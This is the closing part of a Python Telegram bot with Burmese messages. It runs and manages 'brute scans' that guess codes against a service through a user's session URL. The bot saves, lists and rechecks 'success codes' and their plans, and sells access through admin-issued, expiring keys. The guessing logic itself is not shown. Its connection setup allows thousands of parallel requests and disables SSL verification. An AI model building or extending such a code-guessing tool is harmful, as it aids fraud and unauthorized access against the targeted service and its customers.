        data = scan_tasks.get(chat_id)
        if data:
            data["stop"] = True
            try:
                if not data["task"].done():
                    data["task"].cancel()
            except Exception:
                pass
            await safe_reply(message, "Scan ရပ်ထားပါသည်။ ပြန်စလိုပါက /resume ကိုသုံးပါ။")
        else:
            await safe_reply(message, "ရပ်ရန် scan မရှိပါ။")
    except Exception as e:
        log_err("stop_scan", e)

@bot.message_handler(commands=['resume'])
async def resume_scan(message):
    try:
        chat_id = message.chat.id
        if chat_id not in last_scan_params:
            await safe_reply(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
            return
        params = last_scan_params.pop(chat_id)
        await start_brute_scan(chat_id, params['mode'], params['length'],
                                params.get('target'), message,
                                plan_filters=params.get('plan_filters', []))
        await safe_reply(message, "ယခင် scan ပြန်စပါပြီ။")
    except Exception as e:
        log_err("resume_scan", e)

@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    try:
        chat_id = call.message.chat.id
        try:
            await bot.answer_callback_query(call.id)
        except Exception:
            pass
        if call.data == "resume_scan":
            if chat_id not in last_scan_params:
                await safe_edit(chat_id, call.message.message_id, "Resume လုပ်ရန် scan မရှိပါ။")
                return
            params = last_scan_params.pop(chat_id)
            await safe_edit(chat_id, call.message.message_id, "ယခင် scan ပြန်စပါပြီ။")
            await start_brute_scan(chat_id, params['mode'], params['length'],
                                    params.get('target'), call.message,
                                    plan_filters=params.get('plan_filters', []))
        else:
            if chat_id in pending_brute:
                params = pending_brute.pop(chat_id)
                last_scan_params.pop(chat_id, None)
                await safe_edit(chat_id, call.message.message_id, "Scan အသစ်စတင်ပါပြီ။")
                await start_brute_scan(chat_id, params['mode'], params['length'],
                                        params.get('target'), call.message,
                                        plan_filters=params.get('plan_filters', []))
            else:
                await safe_edit(chat_id, call.message.message_id, "Command ထပ်မံပေးပို့ပါ။")
    except Exception as e:
        log_err("handle_resume_callback", e)

@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    try:
        chat_id = message.chat.id
        success = success_texts.get(chat_id, []) or []
        limited = limited_texts.get(chat_id, []) or []
        if not success and not limited:
            await safe_reply(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
            return

        parts = []
        if success:
            parts.append(f"✅ **Success Codes** ({len(success)})")
            for item in success:
                try:
                    c = item["code"]
                    plan = item.get("plan", "N/A")
                    parts.append(f"`{c}` – ⏳ {plan}")
                except Exception:
                    continue
        if limited:
            parts.append(f"\n⚠️ **Limited Codes** ({len(limited)})")
            parts.extend(limited)

        full_text = "\n".join(parts)
        MAX = 4096
        if len(full_text) > MAX:
            for i in range(0, len(full_text), MAX):
                await safe_send(chat_id, full_text[i:i+MAX], parse_mode="Markdown")
        else:
            await safe_reply(message, full_text, parse_mode="Markdown")
    except Exception as e:
        log_err("saved_codes", e)

@bot.message_handler(commands=['delete_saved'])
async def delete_saved(message):
    try:
        chat_id = message.chat.id
        success = success_texts.get(chat_id, [])
        limited = limited_texts.get(chat_id, [])
        if not success and not limited:
            await safe_reply(message, "ဖျက်ရန် code မရှိပါ။")
            return

        success_texts.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        limited_messages.pop(chat_id, None)

        try:
            results, sha = await get_file_content("result.json")
            if isinstance(results, dict) and str(chat_id) in results:
                del results[str(chat_id)]
                await update_file_content("result.json", results, sha, f"Delete codes for {chat_id}")
        except Exception as e:
            log_err("delete_saved-github", e)

        await safe_reply(message, "🗑️ Saved codes အားလုံး ဖျက်ပြီးပါပြီ။")
    except Exception as e:
        log_err("delete_saved", e)

@bot.message_handler(commands=['notify'])
async def toggle_notify(message):
    try:
        chat_id = message.chat.id
        current = notify_setting.get(chat_id, DEFAULT_NOTIFY)
        notify_setting[chat_id] = not current
        state = "ON ✅" if notify_setting[chat_id] else "OFF ❌"
        await safe_reply(message, f"Notify: {state}")
    except Exception as e:
        log_err("toggle_notify", e)

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    try:
        chat_id = message.chat.id
        if not approve.get(chat_id, False):
            await safe_reply(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
            return
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await safe_reply(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
            return
        success = success_texts.get(chat_id, [])
        if not success:
            await safe_reply(message, "Recheck လုပ်ရန် success code မရှိပါ။")
            return
        await safe_reply(message, "Success codes များကို ပြန်လည်စစ်ဆေးနေပါသည်...")
        new_success = []
        for item in success:
            try:
                code = item["code"]
                recode = await perform_check(
                    user_data[chat_id]['session_url'], code, chat_id,
                    recheck=True, message=message
                )
                if recode:
                    new_success.append(item)
            except Exception as e:
                log_err("recheck-item", e)
        if new_success:
            success_texts[chat_id] = new_success
            codes_str = "\n".join([f"`{i['code']}` – ⏳ {i.get('plan','N/A')}"
                                    for i in new_success])
            await safe_reply(message, f"✅ Rechecked Codes ({len(new_success)}):\n{codes_str}",
                             parse_mode="Markdown")
        else:
            success_texts[chat_id] = []
            await safe_reply(message, "Recheck ပြီးပါပြီ၊ success code တစ်ခုမျှမကျန်ပါ။")
    except Exception as e:
        log_err("recheck", e)

@bot.message_handler(commands=['status'])
async def status(message):
    try:
        if str(message.chat.id) != ADMIN_ID:
            await safe_reply(message, "No Permission")
            return
        active_scans = sum(1 for data in scan_tasks.values()
                            if not data.get("task").done())
        approved_users = sum(1 for v in approve.values() if v)
        uptime_seconds = int(time.monotonic() - _start_time)
        hours, remainder = divmod(uptime_seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        pool_available = _session_pool.qsize() if _session_pool is not None else 0
        await safe_reply(
            message,
            f"📊 Bot Status\n\n"
            f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
            f"🔍 Active Scans: {active_scans}\n"
            f"✅ Approved Users: {approved_users}\n"
            f"👥 Sessions Loaded: {len(user_data)}\n"
            f"⚙️ Concurrency: {CONCURRENCY}\n"
            f"🔋 Pool Available: {pool_available}/{POOL_SIZE}"
        )
    except Exception as e:
        log_err("status", e)

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    try:
        if str(message.chat.id) != ADMIN_ID:
            await safe_reply(message, "No Permission")
            return
        args = message.text.split()
        if len(args) < 3:
            await safe_reply(message, "Usage:\n`/genkey 1h30m 123456789`\n`/genkey unlimited 123456789`",
                             parse_mode="Markdown")
            return
        plan = args[1]
        user_id = args[2]
        expiry = generate_expiry(plan)
        if not expiry:
            await safe_reply(message, "Duration ပုံစံမမှန်ပါ။ ဥပမာ: 30m, 1h, 2d, 1h30m, unlimited")
            return
        auth_list, sha = await get_file_content("auth_list.json")
        if not isinstance(auth_list, dict):
            auth_list = {}
        auth_list[user_id] = {"expires_at": expiry, "plan": plan}
        await update_file_content("auth_list.json", auth_list, sha, f"Add key for {user_id}")
        await safe_reply(message,
            f"✅ Key Generated\n\nUSER ID : `{user_id}`\nPLAN : {plan}\nEXPIRES : {expiry}",
            parse_mode="Markdown")
    except Exception as e:
        log_err("genkey", e)

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    try:
        if str(message.chat.id) != ADMIN_ID:
            await safe_reply(message, "No Permission")
            return
        args = message.text.split()
        if len(args) < 2:
            await safe_reply(message, "Usage:\n`/delkey 123456789`", parse_mode="Markdown")
            return
        user_id = args[1]
        auth_list, sha = await get_file_content("auth_list.json")
        if not isinstance(auth_list, dict) or user_id not in auth_list:
            await safe_reply(message, f"User ID {user_id} မတွေ့ပါ။")
            return
        del auth_list[user_id]
        await update_file_content("auth_list.json", auth_list, sha, f"Delete key for {user_id}")
        try:
            approve.pop(int(user_id), None)
            user_data.pop(int(user_id), None)
        except Exception:
            pass
        await safe_reply(message, f"✅ Key Deleted\n\nUSER ID : `{user_id}`", parse_mode="Markdown")
    except Exception as e:
        log_err("delkey", e)

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    try:
        if str(message.chat.id) != ADMIN_ID:
            await safe_reply(message, "No Permission")
            return
        auth_list, _ = await get_file_content("auth_list.json")
        if not isinstance(auth_list, dict) or not auth_list:
            await safe_reply(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            try:
                if isinstance(data, dict):
                    expires = data.get("expires_at", "unknown")
                    plan = data.get("plan", "unknown")
                    if expires == "9999-12-31T23:59:59Z":
                        expires_str = "Unlimited"
                    else:
                        try:
                            exp_dt = datetime.fromisoformat(str(expires).replace("Z", "+00:00"))
                            now = datetime.now(timezone.utc)
                            if exp_dt < now:
                                expires_str = "Expired"
                            else:
                                diff = exp_dt - now
                                days = diff.days
                                hours, rem = divmod(diff.seconds, 3600)
                                minutes = rem // 60
                                expires_str = f"{days}d {hours}h {minutes}m left"
                        except Exception:
                            expires_str = str(expires)
                else:
                    plan = "old"
                    expires_str = str(data)
                lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
            except Exception:
                continue
        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await safe_send(message.chat.id, text[i:i+4096])
        else:
            await safe_reply(message, text)
    except Exception as e:
        log_err("listkeys", e)

# ── Polling ────────────────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except asyncio.CancelledError:
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            log_err("polling-net", e)
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            log_err("polling-unexpected", e)
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

# ── Main ───────────────────────────────────────────────────────────────────
async def main():
    global session, _connector
    if bot is None:
        print("❌ BOT_TOKEN is missing. Exiting.")
        return
    try:
        timeout = aiohttp.ClientTimeout(total=30)
        _connector = aiohttp.TCPConnector(
            limit=5000,
            limit_per_host=2000,
            ttl_dns_cache=600,
            ssl=False,
            keepalive_timeout=60,
            force_close=False,
            enable_cleanup_closed=True
        )
        session = aiohttp.ClientSession(timeout=timeout, connector=_connector,
                                         connector_owner=False)
        await init_session_pool()
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        await start_polling()
    except Exception as e:
        log_err("main", e)
    finally:
        try:
            if session:
                await session.close()
        except Exception:
            pass
        try:
            if _connector:
                await _connector.close()
        except Exception:
            pass

if __name__ == '__main__':
    while True:
        try:
            asyncio.run(main())
            break
        except KeyboardInterrupt:
            break
        except Exception as e:
            log_err("top-level", e)
            time.sleep(5)
